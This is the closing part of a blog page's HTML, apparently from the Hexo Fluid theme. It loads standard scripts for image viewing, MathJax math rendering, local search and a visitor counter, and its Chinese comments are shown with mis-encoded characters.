    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
